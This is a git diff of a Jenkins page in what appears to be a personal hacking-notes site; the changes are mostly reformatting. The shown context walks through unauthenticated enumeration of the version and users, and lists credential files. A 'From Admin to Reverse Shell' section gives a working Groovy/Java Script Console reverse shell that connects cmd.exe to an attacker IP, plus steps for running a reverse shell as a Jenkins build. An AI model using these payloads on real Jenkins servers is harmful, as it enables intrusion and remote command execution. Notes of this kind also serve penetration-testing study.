@@ -1,16 +1,20 @@
-# Jenkins
+---
+title: Jenkins
+category: Software
+order: 4
+---
 
-## Introduction
+# Introduction
 
 Jenkins is a free and open source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration and continuous delivery. It is a server-based system that runs in servlet containers such as Apache Tomcat.
 
-![Jenkins Login.](<../.gitbook/assets/image (15).png>)
+![Jenkins Login.](/hackingnotes/images/jenkins.png)
 
-## Enumeration
+# Enumeration
 
 We can obtain a some valuable information without necessarily log in on the server.
 
-### Jenkins Version
+## Jenkins Version
 
 Visit the following route to obtain the Jenkins version on the footer page.
 
@@ -21,7 +25,7 @@ Visit the following route to obtain the Jenkins version on the footer page.
 Page generated: Sep 27, 2021 12:46:28 PM PDTREST APIJenkins ver. 2.204.1
 ```
 
-### Users
+## Users
 
 Without credentials it is possible to obtain some users.
 
@@ -33,7 +37,7 @@ Without credentials it is possible to obtain some users.
 /securityRealm/user/admin/search/index?q=
 ```
 
-## Credentials
+# Credentials
 
 There are no default credentials but some times these works.
 
@@ -61,17 +65,17 @@ C:\Program Files (x86)\Jenkins\secrets\initialAdminPassword
 C:\Program Files\Jenkins\secrets\initialAdminPassword
 ```
 
-## From Admin to Reverse Shell
+# From Admin to Reverse Shell
 
 There are multiple ways in which from administrative privileges in Jenkins you can get a reverse shell.
 
-### Script Console
+## Script Console
 
 To obtain a Reverse shell we need to execute **`Manage Jenkins`** on **`Script Console.`**
 
-![Jenking Script Console.](<../.gitbook/assets/image (13).png>)
+![Jenking Script Console.](/hackingnotes/images/jenkins_scriptconsole.png)
 
-#### Windows Reverse Shell
+### Windows Reverse Shell
 
 ```
 String host="<IP-ADDR>";
@@ -80,7 +84,7 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-#### Linux Reverse Shell
+### Linux Reverse Shell
 
 First we need to craft the payload.
 
@@ -99,19 +103,19 @@ proc.waitForOrKill(1000)
 println "out> $sout err> $serr"
 ```
 
-### Freestyle Project
+## Freestyle Project
 
 Go on **`New Item`** tab.
 
-![Jenkins Dashboard](<../.gitbook/assets/image (14).png>)
+![Jenkins Dashboard](/hackingnotes/images/jenkins_newitem.png)
 
 Introduce a name such as **`Access`** and select **`Freestyle Project`** .
 
-![Jenkins Creating a New Item.](<../.gitbook/assets/image (16).png>)
+![Jenkins Creating a New Item.](/hackingnotes/images/jenkins_projects.png)
 
 Scroll down until you find the **`Build`** section and add a **`Execute Windows batch command`** as build step.
 
-![Jenkins Execute Windows Batch Command.](<../.gitbook/assets/image (17).png>)
+![Jenkins Execute Windows Batch Command.](/hackingnotes/images/jenkins_build.png)
 
 Introduce the reverse shell on the Command window and click **`Save`**.
 
@@ -121,11 +125,11 @@ Introduce the reverse shell on the Command window and click **`Save`**.
 
 Go to **`Build Now`** section.
 
-![Jenkins Build Now section.](<../.gitbook/assets/image (18).png>)
+![Jenkins Build Now section.](/hackingnotes/images/jenkins_buildnow.png)
 
 When the build is executed a new item will be displayed under the **`Build History`**.
 
-![Jenkins Build History.](<../.gitbook/assets/image (19).png>)
+![Jenkins Build History.](/hackingnotes/images/jenkins_history)
 
 At that moment a reverse shell is obtained.
 
@@ -141,4 +145,4 @@ C:\Windows\system32>
 
 We can also check the console output selecting the **`Built Item #1`** and going to **`Console Output`** section.
 
-![Jenkins Console Output.](<../.gitbook/assets/image (20).png>)
+![Jenkins Console Output.](/hackingnotes/images/jenkins_console.png)
